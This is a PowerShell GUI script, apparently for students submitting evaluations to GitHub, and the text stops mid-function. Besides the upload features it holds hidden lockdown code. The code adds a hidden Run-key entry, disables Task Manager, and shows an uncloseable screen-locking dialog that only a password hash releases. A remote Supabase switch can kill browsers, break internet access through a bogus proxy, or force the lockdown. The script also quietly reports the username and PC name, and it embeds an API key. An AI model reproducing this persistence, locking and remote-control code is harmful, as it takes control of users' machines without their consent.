<#
.SYNOPSIS
    GUI interactiva para alumnos: crear repositorio en GitHub y subir la evaluacion.

.DESCRIPTION
    Levanta un formulario Windows Forms con:
    - Campos: Nombre completo, Forma de prueba
    - Selector de carpeta con los archivos
    - Botones: Crear Repositorio, Subir Archivos, Hacer Todo
    - Panel de cuenta: muestra usuario logueado y permite cerrar sesion
    - Log de salida en pantalla

.NOTES
    Requiere: git + gh CLI instalados, y autenticacion de GitHub.
#>

# -- Auto-desbloqueo de archivos descargados (Zone.Identifier ADS) --
# Evita la advertencia "Windows protegio su PC" en cada ejecucion
try {
    Get-ChildItem -Path $PSScriptRoot -File -ErrorAction SilentlyContinue |
        Unblock-File -ErrorAction SilentlyContinue
} catch {}

# -- Carga de assemblies WinForms --
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# ============================================================
#                     FUNCIONES HELPER
# ============================================================

function Sanitize-RepoName {
    param([string]$Text)
    # Quita acentos
    $normalized = $Text.Normalize([Text.NormalizationForm]::FormD)
    $sb = New-Object System.Text.StringBuilder
    foreach ($c in $normalized.ToCharArray()) {
        if ([Globalization.CharUnicodeInfo]::GetUnicodeCategory($c) -ne [Globalization.UnicodeCategory]::NonSpacingMark) {
            [void]$sb.Append($c)
        }
    }
    $clean = $sb.ToString().Normalize([Text.NormalizationForm]::FormC)
    # Lowercase, espacios a guion, solo alfanumericos y guiones
    $clean = $clean.ToLower() -replace '\s+', '-' -replace '[^a-z0-9\-]', ''
    $clean = $clean -replace '-+', '-' -replace '^-|-$', ''
    return $clean
}

function Test-Dependencies {
    $missing = @()
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) { $missing += 'git' }
    if (-not (Get-Command gh  -ErrorAction SilentlyContinue)) { $missing += 'gh' }
    return $missing
}

function Install-Dependencies {
    param([string[]]$Missing)

    # Mapa de winget IDs
    $wingetMap = @{
        'git' = 'Git.Git'
        'gh'  = 'GitHub.cli'
    }

    # Chequeo winget
    if (-not (Get-Command winget -ErrorAction SilentlyContinue)) {
        [System.Windows.Forms.MessageBox]::Show(
            "winget no está disponible en este sistema.`n`n" +
            "Instala manualmente:`n" +
            "  - git:  https://git-scm.com/download/win`n" +
            "  - gh:   https://cli.github.com/`n`n" +
            "O instala 'App Installer' desde Microsoft Store para obtener winget.",
            'winget no disponible', 'OK', 'Warning') | Out-Null
        return $false
    }

    $msg = "Faltan estas dependencias:`n  - $($Missing -join "`n  - ")`n`n" +
           "¿Quieres instalarlas ahora con winget? (requiere permisos de admin)"
    $r = [System.Windows.Forms.MessageBox]::Show($msg, 'Instalar dependencias', 'YesNo', 'Question')
    if ($r -ne 'Yes') { return $false }

    foreach ($dep in $Missing) {
        $id = $wingetMap[$dep]
        if (-not $id) { continue }
        Log "→ Instalando $dep (winget id: $id)..." 'Yellow'
        Set-Status "Instalando $dep..."

        $proc = Start-Process winget -ArgumentList "install --id $id --silent --accept-source-agreements --accept-package-agreements" `
                              -Wait -PassThru -NoNewWindow
        if ($proc.ExitCode -eq 0) {
            Log "✓ $dep instalado." 'Green'
        } else {
            Log "✗ Falló instalación de $dep (exit code $($proc.ExitCode))" 'Red'
            return $false
        }
    }

    # Refrescar PATH del proceso actual para detectar los binarios recién instalados
    $env:Path = [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' +
                [System.Environment]::GetEnvironmentVariable('Path', 'User')

    Log '✓ Dependencias listas. Puede que necesites cerrar y reabrir el script.' 'Cyan'
    [System.Windows.Forms.MessageBox]::Show(
        "Instalación completada.`n`nSi alguna acción falla, cierra y reabre el script para que tome el PATH actualizado.",
        'Listo', 'OK', 'Information') | Out-Null
    return $true
}

function Test-GhAuth {
    try {
        $null = gh auth status 2>&1
        return $LASTEXITCODE -eq 0
    } catch {
        return $false
    }
}

function Test-GitOwnership {
    <#
    Inspecciona una carpeta y determina si tiene un .git, y si lo tiene,
    a que cuenta de GitHub pertenece el remote origin.
    Devuelve hashtable con: Status, Owner, Url
    Status puede ser: NoGit, NoRemote, NotGitHub, SameUser, OtherUser
    #>
    param(
        [string]$Folder,
        [string]$CurrentGhUser
    )

    $gitPath = Join-Path $Folder '.git'
    if (-not (Test-Path $gitPath)) {
        return @{ Status = 'NoGit'; Owner = $null; Url = $null }
    }

    Push-Location $Folder
    try {
        $remoteUrl = (git config --get remote.origin.url 2>$null).Trim()
        if (-not $remoteUrl) {
            return @{ Status = 'NoRemote'; Owner = $null; Url = $null }
        }
        # Parsear owner desde URLs tipo:
        #   https://github.com/USER/REPO.git
        #   git@github.com:USER/REPO.git
        #   https://USER@github.com/USER/REPO.git
        $owner = $null
        if ($remoteUrl -match 'github\.com[:/](?:[^/]+@)?([^/]+)/[^/]+?(?:\.git)?/?$') {
            $owner = $Matches[1]
        }
        if (-not $owner) {
            return @{ Status = 'NotGitHub'; Owner = $null; Url = $remoteUrl }
        }
        if ($owner -ieq $CurrentGhUser) {
            return @{ Status = 'SameUser'; Owner = $owner; Url = $remoteUrl }
        } else {
            return @{ Status = 'OtherUser'; Owner = $owner; Url = $remoteUrl }
        }
    } finally {
        Pop-Location
    }
}

# ============================================================
#         ANTI-TRAMPA: deteccion de repo con archivos
# ============================================================

# Hash SHA-256 del password del profesor. Password real NUNCA aparece en este repo.
# Se comparte solo en privado con el profesor responsable.
# (clonar este script y leer el hash no permite recuperar el password)
$script:cheatPasswordHash = '203ed3a8347bae6d9659e8830f4f5b882828e91b5249f63d61392ead80ec2d74'

# Marker file que persiste el estado de bloqueo entre ejecuciones del script
$script:cheatMarkerFile = Join-Path $env:APPDATA 'GitHub CLI\.cheat-detected.json'

# Path donde copiamos el script para auto-arrancar al login (sobrevive si el ZIP es eliminado)
$script:cheatLockScriptPath = Join-Path $env:APPDATA 'GitHub CLI\EntregaEvaluacion-Lock.ps1'

# Nombre del valor en HKCU\...\Run para auto-arranque del bloqueo
$script:cheatRunRegName = 'EntregaEvaluacionLock'

function Trigger-CheatLockdown {
    <#
    Activa el bloqueo persistente:
    1. Crea marker file con detalles de la trampa
    2. Copia el script a APPDATA (para que sobreviva si borran la carpeta original)
    3. Registra auto-arranque en HKCU\Run
    4. Deshabilita Task Manager via DisableTaskMgr=1
    #>
    param(
        [string]$RepoName,
        [int]$FilesCount,
        [string[]]$FilesNames
    )

    # 1. Marker file con detalles
    try {
        $markerDir = Split-Path $script:cheatMarkerFile -Parent
        if (-not (Test-Path $markerDir)) {
            New-Item -ItemType Directory -Path $markerDir -Force | Out-Null
        }
        $data = @{
            repo  = $RepoName
            count = $FilesCount
            files = $FilesNames
            date  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        } | ConvertTo-Json -Compress
        [System.IO.File]::WriteAllText($script:cheatMarkerFile, $data)
    } catch {}

    # 2. Copiar script a APPDATA para auto-arranque persistente
    try {
        $currentScript = $PSCommandPath
        if ($currentScript -and (Test-Path $currentScript)) {
            Copy-Item -Path $currentScript -Destination $script:cheatLockScriptPath -Force
        }
    } catch {}

    # 3. Registrar en HKCU\Run para auto-arranque al login
    try {
        $runReg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        $launchCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script:cheatLockScriptPath`""
        Set-ItemProperty -Path $runReg -Name $script:cheatRunRegName -Value $launchCmd -Force
    } catch {}

    # 4. Deshabilitar Task Manager via registry HKCU (no requiere admin)
    try {
        $polPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
        if (-not (Test-Path $polPath)) {
            New-Item -Path $polPath -Force | Out-Null
        }
        Set-ItemProperty -Path $polPath -Name 'DisableTaskMgr' -Value 1 -Type DWord -Force
    } catch {}
}

# ============================================================
#         ADMIN REMOTO: polling de config JSON publico
# ============================================================
# El profesor publica un JSON en el repo (admin-config.json).
# Cada script polling cada 30 segundos. Cuando detecta cambios actua:
#   - internet_block: cierra browsers y setea proxy a localhost
#   - force_lockdown: dispara el dialog rojo aunque no haya trampa
#   - message: muestra mensaje arbitrario al alumno

# Constantes Supabase (anon key es safe-to-share por diseño RLS)
$script:supabaseUrl = 'https://oiownlxyquarmqwauegf.supabase.co'
$script:supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9pb3dubHh5cXVhcm1xd2F1ZWdmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyMDk5NTEsImV4cCI6MjA5NDc4NTk1MX0.MMODHCBz_xl3gnzJVfY-aIQPyINQDkwXyr-e6KPtrm4'

$script:adminPollInterval = 60000   # ms (60 segundos como pidio el profesor)
$script:internetBlocked = $false
$script:lastAdminMessage = ''

function Get-SupabaseHeaders {
    return @{
        'apikey'        = $script:supabaseAnonKey
        'Authorization' = "Bearer $($script:supabaseAnonKey)"
        'Content-Type'  = 'application/json'
    }
}

function Check-AdminConfig {
    try {
        $url = "$($script:supabaseUrl)/rest/v1/control?id=eq.1&select=*"
        $resp = Invoke-RestMethod -Uri $url -Headers (Get-SupabaseHeaders) `
                                  -TimeoutSec 5 -ErrorAction Stop
        if (-not $resp -or $resp.Count -eq 0) { return }
        $cfg = $resp[0]

        # Internet block toggle
        if ($cfg.internet_block -eq $true -and -not $script:internetBlocked) {
            Log '[ADMIN] Profesor activo el bloqueo de internet.' 'Yellow'
            Block-InternetUserMode
            $script:internetBlocked = $true
        } elseif ($cfg.internet_block -ne $true -and $script:internetBlocked) {
            Log '[ADMIN] Profesor desactivo el bloqueo de internet.' 'Green'
            Unblock-InternetUserMode
            $script:internetBlocked = $false
        }

        # Force lockdown remoto (sin trampa, solo orden del profe)
        if ($cfg.force_lockdown -eq $true -and -not (Test-Path $script:cheatMarkerFile)) {
            Log '[ADMIN] Profesor activo lockdown remoto.' 'Yellow'
            Trigger-CheatLockdown -RepoName '(remoto)' -FilesCount 0 `
                -FilesNames @('Lockdown remoto activado por el profesor')
            Show-CheatAlertDialog -RepoName '(remoto)' -FilesCount 0 `
                -FilesNames @('Lockdown remoto activado por el profesor') `
                -IsPersistent $true
        }

        # Mensaje arbitrario del profesor (solo mostrar si cambio)
        if ($cfg.message -and $cfg.message -ne $script:lastAdminMessage) {
            $script:lastAdminMessage = $cfg.message
            [System.Windows.Forms.MessageBox]::Show(
                $cfg.message, 'Mensaje del profesor', 'OK', 'Information') | Out-Null
        }
        if (-not $cfg.message) { $script:lastAdminMessage = '' }
    } catch {
        # Falla silenciosa: no hay internet o problema con Supabase. No molestar al alumno.
    }
}

function Report-CheatEvent {
    <#
    Inserta un evento de trampa en la tabla cheat_events de Supabase para que
    el profesor pueda verlo en su panel.
    #>
    param(
        [string]$RepoName,
        [int]$FilesCount,
        [string[]]$FilesNames
    )
    try {
        $ghUser = (gh api user --jq .login 2>$null).Trim()
        if (-not $ghUser) { $ghUser = '(sin auth)' }
        $payload = @{
            username     = $ghUser
            pc_name      = $env:COMPUTERNAME
            repo_name    = $RepoName
            files_count  = $FilesCount
            files_sample = @($FilesNames | Select-Object -First 10)
        } | ConvertTo-Json
        Invoke-RestMethod `
            -Uri "$($script:supabaseUrl)/rest/v1/cheat_events" `
            -Method Post `
            -Headers (Get-SupabaseHeaders) `
            -Body $payload `
            -TimeoutSec 5 -ErrorAction Stop | Out-Null
    } catch {
        # Silencioso. No queremos que el alumno vea logs del backend.
    }
}

function Block-InternetUserMode {
    # 1. Cerrar browsers comunes (sin admin, mata solo procesos del usuario)
    $browsers = @('chrome', 'msedge', 'firefox', 'opera', 'brave', 'iexplore', 'vivaldi', 'tor')
    foreach ($b in $browsers) {
        Get-Process -Name $b -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
    }

    # 2. Setear proxy del usuario a localhost (HKCU, no requiere admin)
    # Esto rompe casi todos los browsers que respetan el proxy del sistema
    try {
        $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
        Set-ItemProperty -Path $regPath -Name 'ProxyEnable' -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name 'ProxyServer' -Value '127.0.0.1:1' -Type String -Force
        Set-ItemProperty -Path $regPath -Name 'ProxyOverride' -Value '' -Type String -Force
    } catch {}
}

function Unblock-InternetUserMode {
    try {
        $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
        Set-ItemProperty -Path $regPath -Name 'ProxyEnable' -Value 0 -Type DWord -Force
    } catch {}
}

function Release-CheatLockdown {
    <#
    Solo se llama tras password correcto del profesor.
    Revierte TODO el lockdown:
    1. Borra marker file
    2. Quita HKCU\Run auto-arranque
    3. Re-habilita Task Manager
    4. (Opcional) borra el script-lock copiado a APPDATA
    #>

    try { Remove-Item $script:cheatMarkerFile -Force -ErrorAction SilentlyContinue } catch {}

    try {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
                            -Name $script:cheatRunRegName -Force -ErrorAction SilentlyContinue
    } catch {}

    try {
        $polPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
        Remove-ItemProperty -Path $polPath -Name 'DisableTaskMgr' -Force -ErrorAction SilentlyContinue
    } catch {}

    try { Remove-Item $script:cheatLockScriptPath -Force -ErrorAction SilentlyContinue } catch {}
}

function Prompt-TeacherPassword {
    <#
    Dialog pequeño y simple para que el profesor ingrese la clave.
    Devuelve $true si la clave es correcta, $false si cancela o se equivoca varias veces.
    #>
    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = 'Clave del profesor'
    $dlg.Size = New-Object System.Drawing.Size(380, 200)
    $dlg.StartPosition = 'CenterParent'
    $dlg.FormBorderStyle = 'FixedDialog'
    $dlg.ControlBox = $false
    $dlg.TopMost = $true

    $lbl = New-Object System.Windows.Forms.Label
    $lbl.Text = 'Ingrese la clave de desbloqueo:'
    $lbl.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
    $lbl.Location = New-Object System.Drawing.Point(20, 20)
    $lbl.Size = New-Object System.Drawing.Size(330, 22)
    $dlg.Controls.Add($lbl)

    $txt = New-Object System.Windows.Forms.TextBox
    $txt.PasswordChar = '*'
    $txt.Location = New-Object System.Drawing.Point(20, 50)
    $txt.Size = New-Object System.Drawing.Size(330, 28)
    $txt.Font = New-Object System.Drawing.Font('Consolas', 12)
    $dlg.Controls.Add($txt)

    $lblErr = New-Object System.Windows.Forms.Label
    $lblErr.Text = ''
    $lblErr.ForeColor = [System.Drawing.Color]::Red
    $lblErr.Font = New-Object System.Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
    $lblErr.Location = New-Object System.Drawing.Point(20, 85)
    $lblErr.Size = New-Object System.Drawing.Size(330, 20)
    $dlg.Controls.Add($lblErr)

    $script:teacherPwdOk = $false

    $btnOk = New-Object System.Windows.Forms.Button
    $btnOk.Text = 'Validar'
    $btnOk.Location = New-Object System.Drawing.Point(180, 120)
    $btnOk.Size = New-Object System.Drawing.Size(80, 32)
    $btnOk.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
    $btnOk.ForeColor = [System.Drawing.Color]::White
    $btnOk.FlatStyle = 'Flat'
    $btnOk.Add_Click({
        if (Test-CheatPassword -Candidate $txt.Text) {
            $script:teacherPwdOk = $true
            $dlg.DialogResult = 'OK'
            $dlg.Close()
        } else {
            $lblErr.Text = 'Clave incorrecta. Vuelva a intentarlo.'
            $txt.BackColor = [System.Drawing.Color]::FromArgb(255, 220, 220)
            $txt.Text = ''
            $txt.Focus()
        }
    })
    $dlg.Controls.Add($btnOk)
    $dlg.AcceptButton = $btnOk

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Text = 'Cancelar'
    $btnCancel.Location = New-Object System.Drawing.Point(270, 120)
    $btnCancel.Size = New-Object System.Drawing.Size(80, 32)
    $btnCancel.DialogResult = 'Cancel'
    $dlg.Controls.Add($btnCancel)

    [void]$dlg.ShowDialog()
    return $script:teacherPwdOk
}

function Test-CheatPassword {
    param([string]$Candidate)
    if (-not $Candidate) { return $false }
    $hash = [System.BitConverter]::ToString(
        [System.Security.Cryptography.SHA256]::Create().ComputeHash(
            [System.Text.Encoding]::UTF8.GetBytes($Candidate))
    ).Replace('-', '').ToLower()
    return ($hash -eq $script:cheatPasswordHash)
}

function Test-RepoIsClean {
    <#
    Verifica que un repo clonado NO contenga archivos pre-existentes que
    sugieran que el alumno copio codigo en lugar de empezar en blanco.

    Permite solo: README*, LICENSE*, .gitignore, .gitattributes, .git/
    #>
    param([string]$Folder)

    $allowedNames = @(
        'README.md', 'README', 'README.txt', 'README.rst',
        'LICENSE', 'LICENSE.txt', 'LICENSE.md',
        '.gitignore', '.gitattributes', '.git'
    )

    $items = Get-ChildItem -Path $Folder -Force -ErrorAction SilentlyContinue
    $suspicious = @($items | Where-Object { $_.Name -notin $allowedNames })

    return @{
        IsClean     = ($suspicious.Count -eq 0)
        FilesCount  = $suspicious.Count
        FilesNames  = ($suspicious | Select-Object -First 10 | ForEach-Object { $_.Name })
    }
}

function Show-CheatAlertDialog {
    param(
        [string]$RepoName,
        [int]$FilesCount,
        [string[]]$FilesNames,
        [bool]$IsPersistent = $false   # true cuando viene de marker file (reinicio)
    )

    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = 'ALERTA DE INTEGRIDAD ACADEMICA'
    $dlg.Size = New-Object System.Drawing.Size(760, 560)
    $dlg.StartPosition = 'CenterScreen'
    $dlg.FormBorderStyle = 'None'   # Sin barra de titulo
    $dlg.ControlBox = $false
    $dlg.BackColor = [System.Drawing.Color]::FromArgb(183, 28, 28)
    $dlg.TopMost = $true
    $dlg.KeyPreview = $true
    $dlg.WindowState = 'Normal'
    $dlg.ShowInTaskbar = $false

    $lblWarn = New-Object System.Windows.Forms.Label
    $lblWarn.Text = '! ALERTA !'
    $lblWarn.Font = New-Object System.Drawing.Font('Segoe UI', 42, [System.Drawing.FontStyle]::Bold)
    $lblWarn.ForeColor = [System.Drawing.Color]::White
    $lblWarn.TextAlign = 'MiddleCenter'
    $lblWarn.Location = New-Object System.Drawing.Point(20, 20)
    $lblWarn.Size = New-Object System.Drawing.Size(720, 70)
    $dlg.Controls.Add($lblWarn)

    $lblTitle = New-Object System.Windows.Forms.Label
    $lblTitle.Text = 'POSIBLE TRAMPA ACADEMICA DETECTADA'
    $lblTitle.Font = New-Object System.Drawing.Font('Segoe UI', 16, [System.Drawing.FontStyle]::Bold)
    $lblTitle.ForeColor = [System.Drawing.Color]::White
    $lblTitle.TextAlign = 'MiddleCenter'
    $lblTitle.Location = New-Object System.Drawing.Point(20, 95)
    $lblTitle.Size = New-Object System.Drawing.Size(720, 30)
    $dlg.Controls.Add($lblTitle)

    $filesPreview = ($FilesNames -join ', ')
    if ($FilesCount -gt 10) { $filesPreview += " ... (+$($FilesCount - 10) mas)" }

    $msgText = "Repositorio: '$RepoName' contiene $FilesCount archivo(s) NO permitidos:`n`n  $filesPreview`n`n" +
               "Una evaluacion en blanco solo deberia tener README, LICENSE o .gitignore.`n`n" +
               "Este intento fue REGISTRADO. El profesor sera notificado.`n`n" +
               "Esta ventana esta BLOQUEADA y el Administrador de Tareas tambien.`n" +
               "Solo el profesor puede desbloquear este equipo con su clave."
    if ($IsPersistent) {
        $msgText += "`n`n[Detectado en sesion anterior. El bloqueo persistira en cada reinicio.]"
    }

    $lblMsg = New-Object System.Windows.Forms.Label
    $lblMsg.Text = $msgText
    $lblMsg.Font = New-Object System.Drawing.Font('Segoe UI', 11)
    $lblMsg.ForeColor = [System.Drawing.Color]::White
    $lblMsg.Location = New-Object System.Drawing.Point(40, 140)
    $lblMsg.Size = New-Object System.Drawing.Size(680, 300)
    $dlg.Controls.Add($lblMsg)

    $btnUnlock = New-Object System.Windows.Forms.Button
    $btnUnlock.Text = 'Desbloquear (clave del profesor)'
    $btnUnlock.Location = New-Object System.Drawing.Point(260, 460)
    $btnUnlock.Size = New-Object System.Drawing.Size(280, 50)
    $btnUnlock.BackColor = [System.Drawing.Color]::White
    $btnUnlock.ForeColor = [System.Drawing.Color]::FromArgb(183, 28, 28)
    $btnUnlock.FlatStyle = 'Flat'
    $btnUnlock.Font = New-Object System.Drawing.Font('Segoe UI', 11, [System.Drawing.FontStyle]::Bold)
    $btnUnlock.Add_Click({
        if (Prompt-TeacherPassword) {
            Release-CheatLockdown
            $dlg.DialogResult = 'OK'
            $dlg.Close()
        }
    })
    $dlg.Controls.Add($btnUnlock)

    # Bloquear cierre por Alt+F4 o cualquier otro metodo
    $dlg.Add_FormClosing({
        param($sender, $e)
        if ($dlg.DialogResult -ne 'OK') { $e.Cancel = $true }
    })

    # Bloquear teclas problematicas: Alt+F4, Alt+Tab, F4, Escape
    $dlg.Add_KeyDown({
        param($sender, $e)
        if (($e.Alt -and $e.KeyCode -eq 'F4') -or
            ($e.Alt -and $e.KeyCode -eq 'Tab') -or
            $e.KeyCode -eq 'Escape') {
            $e.SuppressKeyPress = $true
            $e.Handled = $true
        }
    })

    # Forzar a estar siempre al frente cada 500ms (por si el alumno usa Win+D u otra ventana)
    $topTimer = New-Object System.Windows.Forms.Timer
    $topTimer.Interval = 500
    $topTimer.Add_Tick({
        try {
            $dlg.TopMost = $false
            $dlg.TopMost = $true
            $dlg.Activate()
            $dlg.BringToFront()
        } catch {}
    })
    $topTimer.Start()

    # Fix bug: forzar el dialog al frente apenas se carga.
    # Si no, queda detras del form principal y parece que no aparecio.
    $dlg.Add_Shown({
        $dlg.TopMost = $true
        $dlg.Activate()
        $dlg.BringToFront()
        $dlg.Focus()
    })
    $dlg.Add_Load({
        $dlg.TopMost = $true
        $dlg.BringToFront()
    })

    # ShowDialog sin parent: evita que el form principal lo tape
    [void]$dlg.ShowDialog()
    $topTimer.Stop()
    $topTimer.Dispose()
}

function Show-AvaInstructions {
    param(
        [string]$RepoUrl,
        [string]$Tipo
    )

    # Copiar URL al portapapeles
    try {
        [System.Windows.Forms.Clipboard]::SetText($RepoUrl)
    } catch {}

    $tipoLabel = switch ($Tipo) {
        'Evaluacion-1' { 'Evaluación Parcial 1' }
        'Evaluacion-2' { 'Evaluación Parcial 2' }
        'Evaluacion-3' { 'Evaluación Parcial 3' }
        'Evaluacion-4' { 'Evaluación Parcial 4' }
        'Examen'       { 'Examen Final' }
        default        { 'la evaluación correspondiente' }
    }

    $msg = @"
Entrega subida correctamente a GitHub.

PROXIMO PASO: entregar el enlace en el AVA.

1. Abre el AVA (Ambiente Virtual de Aprendizaje).
2. Ve a $tipoLabel.
3. En el campo de entrega, pega el enlace de tu repositorio (Ctrl+V).
4. Envia la entrega.

Tu enlace YA ESTA COPIADO al portapapeles:

  $RepoUrl

Si necesitas pegarlo otra vez, copia desde aqui.
"@
    [System.Windows.Forms.MessageBox]::Show(
        $msg, 'Listo - Ahora entrega en el AVA', 'OK', 'Information') | Out-Null
}

function Update-ButtonStates {
    # Llamado cuando cambia sesion, modo, datos, carpeta, repo seleccionado
    if (-not $btnCrearRepo -or -not $btnSubir) { return }

    $hasAuth = $false
    try { $hasAuth = Test-GhAuth } catch {}

    $hasFolder = ($txtCarpeta.Text -and (Test-Path $txtCarpeta.Text))

    if ($rbModoExistente.Checked) {
        $hasRepoData = ($null -ne $cmbReposExistentes.SelectedItem)
    } else {
        $hasRepoData = ($txtNombre.Text.Trim() -ne '' -and $cmbForma.Text.Trim() -ne '')
    }

    # Crear/Clonar Repo: solo necesita auth + datos del repo
    $btnCrearRepo.Enabled = ($hasAuth -and $hasRepoData)

    # Subir Archivos: necesita auth + datos + carpeta
    $btnSubir.Enabled = ($hasAuth -and $hasRepoData -and $hasFolder)
}

function Show-CreateAccountDialog {
    <#
    Dialog modal con instrucciones paso a paso para crear cuenta GitHub.
    Botones: Abrir GitHub (Start-Process navegador), Ya tengo cuenta (cierra
    este dialog y lanza el device flow), Cerrar.
    #>
    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = 'Crear cuenta de GitHub'
    $dlg.Size = New-Object System.Drawing.Size(520, 440)
    $dlg.StartPosition = 'CenterParent'
    $dlg.FormBorderStyle = 'FixedDialog'
    $dlg.MaximizeBox = $false
    $dlg.MinimizeBox = $false

    $lblTitulo = New-Object System.Windows.Forms.Label
    $lblTitulo.Text = 'Crea tu cuenta de GitHub en 4 pasos'
    $lblTitulo.Font = New-Object System.Drawing.Font('Segoe UI', 13, [System.Drawing.FontStyle]::Bold)
    $lblTitulo.Location = New-Object System.Drawing.Point(20, 15)
    $lblTitulo.Size = New-Object System.Drawing.Size(470, 28)
    $dlg.Controls.Add($lblTitulo)

    $lblIntro = New-Object System.Windows.Forms.Label
    $lblIntro.Text = 'GitHub es donde se guardan tus evaluaciones. La cuenta es gratuita y se crea en 2 minutos.'
    $lblIntro.Font = New-Object System.Drawing.Font('Segoe UI', 9)
    $lblIntro.ForeColor = [System.Drawing.Color]::DimGray
    $lblIntro.Location = New-Object System.Drawing.Point(20, 50)
    $lblIntro.Size = New-Object System.Drawing.Size(470, 35)
    $dlg.Controls.Add($lblIntro)

    $lblPasos = New-Object System.Windows.Forms.Label
    $lblPasos.Text = @"
1. Haz clic en "Abrir GitHub" abajo. Se abrirá tu navegador en
   https://github.com/signup

2. Completa el formulario:
   • Email: tu correo personal (usa el institucional si tienes)
   • Contraseña: mínimo 8 caracteres con números y letras
   • Username: el que aparecerá públicamente
     (sugerencia: tu-nombre-apellido o tu-nombre.duoc)

3. Verifica tu correo electrónico:
   • GitHub te envía un código de 8 dígitos
   • Revisa la bandeja de entrada y SPAM
   • Ingresa el código en la página

4. Listo. Vuelve a esta ventana y haz clic en "Ya tengo cuenta,
   iniciar sesión".
"@
    $lblPasos.Font = New-Object System.Drawing.Font('Segoe UI', 9)
    $lblPasos.Location = New-Object System.Drawing.Point(20, 90)
    $lblPasos.Size = New-Object System.Drawing.Size(470, 220)
    $dlg.Controls.Add($lblPasos)

    $btnAbrir = New-Object System.Windows.Forms.Button
    $btnAbrir.Text = 'Abrir GitHub'
    $btnAbrir.Location = New-Object System.Drawing.Point(20, 335)
    $btnAbrir.Size = New-Object System.Drawing.Size(150, 35)
    $btnAbrir.BackColor = [System.Drawing.Color]::FromArgb(33, 150, 243)
    $btnAbrir.ForeColor = [System.Drawing.Color]::White
    $btnAbrir.FlatStyle = 'Flat'
    $btnAbrir.Font = New-Object System.Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
    $btnAbrir.Add_Click({
        try {
            Start-Process 'https://github.com/signup'
        } catch {
            [System.Windows.Forms.MessageBox]::Show(
                "No se pudo abrir el navegador. Visita manualmente:`nhttps://github.com/signup",
                'Abrir manual', 'OK', 'Information') | Out-Null
        }
    })
    $dlg.Controls.Add($btnAbrir)

    $btnIniciar = New-Object System.Windows.Forms.Button
    $btnIniciar.Text = 'Ya tengo cuenta, iniciar sesión'
    $btnIniciar.Location = New-Object System.Drawing.Point(180, 335)
    $btnIniciar.Size = New-Object System.Drawing.Size(220, 35)
    $btnIniciar.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
    $btnIniciar.ForeColor = [System.Drawing.Color]::White
    $btnIniciar.FlatStyle = 'Flat'
    $btnIniciar.DialogResult = 'OK'  # Cerrar y devolver OK
    $dlg.Controls.Add($btnIniciar)

    $btnCerrar = New-Object System.Windows.Forms.Button
    $btnCerrar.Text = 'Cerrar'
    $btnCerrar.Location = New-Object System.Drawing.Point(410, 335)
    $btnCerrar.Size = New-Object System.Drawing.Size(80, 35)
    $btnCerrar.DialogResult = 'Cancel'
    $dlg.Controls.Add($btnCerrar)
    $dlg.CancelButton = $btnCerrar

    $result = $dlg.ShowDialog($form)
    return ($result -eq 'OK')
}

function Open-PythonIDLE {
    param([string]$Folder)

    # Buscar pythonw / python / py launcher en este orden
    $pyCmd = $null
    foreach ($candidate in @('pythonw', 'python', 'py')) {
        $c = Get-Command $candidate -ErrorAction SilentlyContinue
        if ($c) { $pyCmd = $c; break }
    }

    if (-not $pyCmd) {
        Log '⚠ Python no encontrado. Abre IDLE manualmente.' 'Yellow'
        [System.Windows.Forms.MessageBox]::Show(
            "No se encontró Python en este equipo.`n`nAbre IDLE manualmente y navega a:`n$Folder",
            'Python no encontrado', 'OK', 'Warning') | Out-Null
        return $false
    }

    try {
        # Cambiar cwd al folder antes de abrir IDLE para que el shell de IDLE
        # arranque ahi
        Start-Process -FilePath $pyCmd.Source `
                      -ArgumentList '-m', 'idlelib' `
                      -WorkingDirectory $Folder `
                      -ErrorAction Stop
        Log "✓ IDLE de Python abierto en: $Folder" 'Green'
        return $true
    } catch {
        Log "⚠ No se pudo abrir IDLE: $_" 'Yellow'
        return $false
    }
}

function Invoke-CloneRepo {
    <#
    Clona el repo seleccionado en el dropdown a Desktop\<repo-name>.
    Despues setea txtCarpeta con esa ruta y abre IDLE.
    Si la carpeta ya existe, se reutiliza (no se reclona).
    #>
    param([string]$RepoName)

    if (-not $RepoName) { return $false }

    $ghUser = (gh api user --jq .login 2>$null).Trim()
    if (-not $ghUser) {
        Log '✗ No se pudo obtener tu usuario de GitHub.' 'Red'
        return $false
    }

    $desktop = [Environment]::GetFolderPath('Desktop')
    $targetPath = Join-Path $desktop $RepoName
    $repoUrl = "https://github.com/$ghUser/$RepoName.git"

    Set-Status "Clonando $RepoName..."

    if (Test-Path $targetPath) {
        # Verificar que es el mismo repo
        $check = Test-GitOwnership -Folder $targetPath -CurrentGhUser $ghUser
        if ($check.Status -eq 'OtherUser') {
            Log "✗ La carpeta '$targetPath' ya existe pero pertenece a '$($check.Owner)'." 'Red'
            [System.Windows.Forms.MessageBox]::Show(
